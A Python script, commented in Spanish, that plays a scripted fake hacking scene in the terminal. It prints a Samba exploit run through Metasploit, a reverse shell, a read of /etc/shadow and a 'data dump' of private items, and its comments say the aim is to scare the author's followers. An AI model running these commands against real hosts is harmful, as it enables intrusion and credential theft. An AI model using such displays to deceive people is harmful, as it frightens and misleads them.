import time
import random
import sys
import os

# --- ESTÉTICA NEÓN ---
RESET = '\033[0m'
BOLD = '\033[1m'
GREEN = '\033[38;5;46m'       # Verde Hacker Clásico
NEON_GREEN = '\033[38;5;82m'  # Verde Radioactivo
RED = '\033[38;5;196m'        # Rojo Error
BLUE = '\033[38;5;39m'        # Azul Sistema
CYAN = '\033[38;5;51m'        # Cyan Futuro
GREY = '\033[38;5;240m'       # Comentarios
YELLOW = '\033[38;5;226m'     # Warnings
WHITE = '\033[38;5;255m'      # Blanco puro

# --- 💀 CONFIGURACIÓN DE LA VÍCTIMA 💀 ---
# Edita esto para que salgan cosas que asusten a tus seguidores
VICTIM_DATA = [
    "SAN_CRISTOBAL_DE_LA_LAGUNA", # Tu ubicación (o la de ellos)
    "WHATSAPP_DB_DECRYPTED",
    "FOTOS_PRIVADAS.zip",
    "DCIM_CAMERA_UPLOAD",
    "CONTRASEÑAS_CHROME.txt",
    "INSTAGRAM_SESSION_TOKEN",
    "AUDIO_RECORDINGS_DUMP",
    "GEOLOCATION_TRACKER_LOG"
]

# --- MOTOR DE ACTUACIÓN (HUMAN TYPING) ---
def human_type(text, color=GREEN, speed_factor=1.0):
    """
    Simula a un humano escribiendo.
    - Velocidad variable.
    - Comete errores y corrige (backspace).
    """
    sys.stdout.write(color + BOLD)
    
    for char in text:
        # 5% de probabilidad de equivocarse
        if random.random() < 0.05 and char != ' ':
            wrong_char = chr(ord(char) + random.randint(1, 3))
            sys.stdout.write(wrong_char)
            sys.stdout.flush()
            time.sleep(random.uniform(0.1, 0.2))
            sys.stdout.write('\b \b') # Borrar el error
            sys.stdout.flush()
            time.sleep(0.1)

        sys.stdout.write(char)
        sys.stdout.flush()
        
        # Ritmo de tecleo variable
        base_speed = random.uniform(0.03, 0.12)
        if char == ' ':
            base_speed += 0.05
        
        time.sleep(base_speed / speed_factor)
    
    sys.stdout.write(RESET + "\n")
    time.sleep(random.uniform(0.3, 0.8))

def system_msg(text, color=BLUE, delay=0):
    """Mensajes automáticos del sistema."""
    print(f"{color}{text}{RESET}")
    if delay > 0:
        time.sleep(delay)

def wait_bar(label, seconds):
    """Barra de carga para generar ansiedad."""
    sys.stdout.write(f"{BLUE}[*] {label}... {RESET}")
    sys.stdout.flush()
    time.sleep(0.5)
    
    chars = ["|", "/", "-", "\\"]
    end_time = time.time() + seconds
    while time.time() < end_time:
        for char in chars:
            sys.stdout.write(f"\b{CYAN}{char}{RESET}")
            sys.stdout.flush()
            time.sleep(0.1)
    sys.stdout.write(f"\b{GREEN}[DONE]{RESET}\n")
    time.sleep(0.5)

# --- LA PELÍCULA ---
def main_sequence():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # 1. INTRODUCCIÓN
    print(f"{NEON_GREEN}")
    print(r"""
   __      _     _           
  / /  ___| | __| | ___   _  
 / /  / _ \ |/ _` |/ _ \ (_) 
/ /__| (_) | | (_| | (_) | _ 
\____/\___/|_|\__,_|\___/ (_) 
    """)
    print(f"{GREY}   < LOKKY_PROTOCOL_INITIATED >{RESET}\n")
    time.sleep(2)

    # 2. RECONOCIMIENTO
    system_msg("root@lokky-kali:~# ", WHITE)
    sys.stdout.write("\033[F")
    human_type("root@lokky-kali:~# nmap -sV --script=vuln 192.168.1.55", WHITE)
    
    system_msg("Starting Nmap 7.94 at 2026-01-09 13:58 CET", BLUE, 1)
    system_msg("Nmap scan report for target-machine (192.168.1.55)", BLUE, 0.5)
    print(f"{GREY}Host is up (0.0023s latency).{RESET}")
    time.sleep(1)
    
    ports = [
        "22/tcp   open  ssh     OpenSSH 7.6p1",
        "80/tcp   open  http    Apache httpd 2.4.29",
        "139/tcp  open  netbios Samba smbd 3.X",
        "445/tcp  open  netbios Samba smbd 4.3.11-Ubuntu"
    ]
    
    for p in ports:
        print(f"{GREEN}{p}{RESET}")
        time.sleep(0.2)
        
    time.sleep(2)
    print(f"{RED}{BOLD}[!] VULNERABILITY DETECTED: SAMBA REMOTE CODE EXECUTION (CVE-2017-7494){RESET}")
    time.sleep(2)

    # 3. LANZANDO METASPLOIT
    system_msg("\nroot@lokky-kali:~# ", WHITE)
    sys.stdout.write("\033[F")
    human_type("root@lokky-kali:~# msfconsole -q", WHITE)
    
    print(f"{BLUE}msf6 > {RESET}", end="")
    sys.stdout.flush()
    time.sleep(1)
    human_type("use exploit/linux/samba/is_known_pipename", WHITE, 1.2)
    
    print(f"{BLUE}msf6 exploit({RED}samba/is_known_pipename{BLUE}) > {RESET}", end="")
    time.sleep(0.5)
    human_type("set RHOSTS 192.168.1.55", WHITE, 1.5)
    print(f"RHOSTS => 192.168.1.55")

    print(f"{BLUE}msf6 exploit({RED}samba/is_known_pipename{BLUE}) > {RESET}", end="")
    time.sleep(0.5)
    human_type("set LHOST 10.10.14.23", WHITE, 1.5)
    print(f"LHOST => 10.10.14.23")
    
    # 4. EL MOMENTO DE LA VERDAD
    print(f"{BLUE}msf6 exploit({RED}samba/is_known_pipename{BLUE}) > {RESET}", end="")
    time.sleep(1)
    human_type("exploit", NEON_GREEN, 0.8)
    
    # 5. EL HACKEO
    system_msg("[*] Started reverse TCP handler on 10.10.14.23:4444", BLUE, 1)
    wait_bar("Sending payload (libbindshell.so)", 3)
    wait_bar("Triggering vulnerability", 2)
    
    print(f"{GREY}[*] 192.168.1.55:445 - Probe response indicates vulnerable Samba...{RESET}")
    time.sleep(1)
    print(f"{GREY}[*] 192.168.1.55:445 - Load libbindshell.so and execute...{RESET}")
    time.sleep(2)
    
    print(f"\n{NEON_GREEN}{BOLD}[+] COMMAND SHELL SESSION 1 OPENED (10.10.14.23:4444 -> 192.168.1.55:38291){RESET}")
    time.sleep(1)
    
    # 6. POST-EXPLOTACIÓN
    human_type("whoami", WHITE, 1.2)
    print(f"{RED}root{RESET}")
    time.sleep(0.5)
    
    human_type("cat /etc/shadow | grep admin", WHITE, 1.5)
    print(f"{YELLOW}admin:$6$G9s8f7...:18231:0:99999:7:::{RESET}")
    
    # 7. LA LLUVIA DE DATOS PERSONALIZADA (Aquí está la magia)
    time.sleep(1)
    print(f"{CYAN}[*] INITIATING FULL SYSTEM DUMP...{RESET}")
    time.sleep(1)
    
    try:
        # 12 segundos de lluvia para que dé tiempo a leer
        t_end = time.time() + 12
        while time.time() < t_end:
            # 1. Generamos ruido hexadecimal
            chunk_len = random.randint(20, 50)
            chunk = "".join(random.choice("0123456789ABCDEF") for _ in range(chunk_len))
            
            # 2. Inyección de palabras clave (30% de probabilidad)
            if random.random() < 0.3:
                # Elegimos una palabra de tu lista
                scary_word = random.choice(VICTIM_DATA)
                
                # Le ponemos color ROJO parpadeante visualmente (destaca sobre el verde)
                chunk += f" {RED}{BOLD}>> {scary_word} <<{RESET}"
                
                # Volvemos al color Matrix para el resto de la línea
                chunk += random.choice([GREEN, NEON_GREEN, CYAN])
            
            # 3. Rellenamos el final de la línea
            chunk += "".join(random.choice("0123456789ABCDEF") for _ in range(30))
            
            # Colores base aleatorios
            base_color = random.choice([GREEN, NEON_GREEN, WHITE])
            print(f"{base_color}{chunk}{RESET}")
            
            # Velocidad Matrix
            time.sleep(0.01)

    except KeyboardInterrupt:
        pass
        
    print(f"\n{RED}{BOLD}>>> SYSTEM COMPROMISED. DATA UPLOAD COMPLETE. <<<{RESET}")
    print(f"{GREY}Session terminated.{RESET}\n")

if __name__ == "__main__":
    try:
        main_sequence()
    except KeyboardInterrupt:
        sys.exit()